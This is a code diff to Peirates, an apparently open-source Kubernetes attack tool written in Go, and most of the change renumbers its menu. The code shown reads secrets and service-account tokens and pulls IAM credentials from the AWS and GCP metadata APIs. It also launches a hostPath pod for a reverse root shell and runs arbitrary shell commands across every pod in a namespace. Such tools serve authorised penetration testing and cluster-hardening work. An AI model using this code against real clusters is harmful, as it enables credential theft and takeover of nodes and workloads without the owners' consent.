@@ -329,8 +329,8 @@ func getListOfPods(connectionString ServerInfo) {
 
 // execInAllPods() runs kubeData.command in all running pods
 func execInAllPods(connectionString ServerInfo, command string) {
-	if !kubectlAuthCanI(connectionString, "exec") {
-		println("Permission Denied: your service account isn't allowed to exec")
+	if !kubectlAuthCanI(connectionString, "exec", "pod") {
+		println("Permission Denied: your service account isn't allowed to exec commands in pods")
 		return
 	}
 	runningPods := getPodList(connectionString)
@@ -349,14 +349,13 @@ func execInAllPods(connectionString ServerInfo, command string) {
 
 // execInListPods() runs kubeData.command in all pods in kubeData.list
 func execInListPods(connectionString ServerInfo, pods []string, command string) {
-	if !kubectlAuthCanI(connectionString, "exec") {
-		println("Permission Denied: your service account isn't allowed to exec")
+	if !kubectlAuthCanI(connectionString, "exec", "pods") {
+		println("Permission Denied: your service account isn't allowed to exec commands in pods")
 		return
 	}
 
 	fmt.Println("+ Running supplied command in list of pods")
 	for _, execPod := range pods {
-
 		execInPodOut, _, err := runKubectlSimple(connectionString, "exec", "-it", execPod, "--", "/bin/sh", "-c", command)
 		if err != nil {
 			fmt.Println("[-] Executing "+command+" in Pod "+execPod+" failed: ", err)
@@ -920,27 +919,26 @@ func PeiratesMain() {
 		println(`----------------------------------------------------------------
 Namespaces, Service Accounts and Roles |
 ---------------------------------------+
-[1] List, maintain, or switch service accounts
+[1] List, maintain, or switch service account contexts
 [2] List and/or change namespaces
 [3] Get list of pods
 [4] Get complete info on all pods (json)
-[10] Check all pods for volume mounts
-
+[5] Check all pods for volume mounts
 -------------------------+
 Steal Service Accounts   |
 -------------------------+
-[5] Get list of secrets
-[6] Get a service account token from a secret
-[13] Request IAM credentials from AWS Metadata API [AWS only]
-[14] Request IAM credentials from GCP Metadata API [GCP only]
-[15] Request kube-env from GCP Metadata API [GCP only]
-[17] Pull Kubernetes service account tokens from GCS [GCP only] 
+[10] Get secrets from API server
+[11] Get a service account token from a secret
+[12] Request IAM credentials from AWS Metadata API [AWS only]
+[13] Request IAM credentials from GCP Metadata API [GCP only]
+[14] Request kube-env from GCP Metadata API [GCP only]
+[15] Pull Kubernetes service account tokens from GCS [GCP only] 
 -----------+
 Compromise |
 -----------+
-[11] Gain a reverse rootshell by launching a hostPath / pod
-[30] Run command in one or all pods in this namespace 
-[33] Run a command in a pod via a Kubelet [not yet implemented]
+[20] Gain a reverse rootshell by launching a hostPath / pod
+[21] Run command in one or all pods in this namespace
+[22] Run a command in a pod via a Kubelet [not yet implemented]
 
 -----+
 Misc |
@@ -1057,8 +1055,8 @@ Peirates:># `)
 			GetPodsInfo(connectionString, &podInfo)
 			break
 
-		//	[5] Get list of secrets
-		case "5":
+		//	[10] Get secrets from API server
+		case "10":
 			secrets, service_account_tokens := getSecretList(connectionString)
 			for _, secret := range secrets {
 				println("Secret found: ", secret)
@@ -1068,8 +1066,8 @@ Peirates:># `)
 			}
 			break
 
-		// [6] Get a service account token from a secret
-		case "6":
+		// [11] Get a service account token from a secret
+		case "11":
 			println("\nPlease enter the name of the secret for which you'd like the contents: ")
 			var secret_name string
 			fmt.Scanln(&secret_name)
@@ -1137,7 +1135,9 @@ Peirates:># `)
 			}
 
 			break
-		case "10":
+
+		// [5] Check all pods for volume mounts
+		case "5":
 			println("\n[1] Get all host mount points\n[2] Get volume mount points for a specific pod\n\nPeirates:># ")
 			fmt.Scanln(&input)
 
@@ -1157,8 +1157,8 @@ Peirates:># `)
 				GetHostMountPointsForPod(podInfo, user_response)
 			}
 
-		// [11] Launch a pod mounting its node's host filesystem
-		case "11":
+		// [20] Gain a reverse rootshell by launching a hostPath / pod
+		case "20":
 			allPods := getPodList(connectionString)
 			// TODO: See if we can put the auth check back
 			//podCreation := canCreatePods(connectionString)
@@ -1177,8 +1177,8 @@ Peirates:># `)
 			MountRootFS(allPods, connectionString, ip, port)
 			break
 
-		// [13] Request IAM credentials from AWS Metadata API [AWS only] [not yet implemented]
-		case "13":
+		// [12] Request IAM credentials from AWS Metadata API [AWS only] [not yet implemented]
+		case "12":
 			resp, err := http.Get("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
 			if err != nil {
 				println("Error - could not perform request http://169.254.169.254/latest/meta-data/iam/security-credentials/")
@@ -1199,8 +1199,8 @@ Peirates:># `)
 			println(string(body_2))
 			break
 
-		// [14] Request IAM credentials from GCP Metadata API [GCP only] [not yet implemented]
-		case "14":
+		// [13] Request IAM credentials from GCP Metadata API [GCP only]
+		case "13":
 			// Create a new HTTP client that uses the correct headers
 			client := &http.Client{}
 			// Make a request for our service account(s)
@@ -1227,8 +1227,8 @@ Peirates:># `)
 			}
 			break
 
-		// [15] Request kube-env from GCP Metadata API [GCP only]
-		case "15":
+		// [14] Request kube-env from GCP Metadata API [GCP only]
+		case "14":
 			// Create a new HTTP client that uses the correct headers
 			client := &http.Client{}
 			// Make a request for kube-env, in case it is in the instance attributes, as with a number of installers
@@ -1276,8 +1276,8 @@ Peirates:># `)
 
 			break
 
-		// [16] Pull Kubernetes service account tokens from GCS [GCP only] [not yet implemented]
-		case "16":
+		// [15] Pull Kubernetes service account tokens from GCS [GCP only]
+		case "15":
 
 			token := GetGCPBearerTokenFromMetadataAPI("default")
 			if token == "ERROR" {
@@ -1416,8 +1416,8 @@ Peirates:># `)
 			break
 		case "19":
 			break
-		// [30] Run command in one or all pods in this namespace
-		case "30":
+		// [21] Run command in one or all pods in this namespace
+		case "21":
 			banner(connectionString)
 			println("\n[1] Run command on a specific pod\n[2] Run command on all pods")
 			fmt.Scanln(&input)
@@ -1433,6 +1433,7 @@ Peirates:># `)
 
 				if cmdOpts.commandToRunInPods != "" {
 					if len(cmdOpts.podsToRunTheCommandIn) > 0 {
+						// BUG: execInListPods and execInAllPods both need to be able to split the command on whitespace
 						execInListPods(connectionString, cmdOpts.podsToRunTheCommandIn, cmdOpts.commandToRunInPods)
 					}
 				}
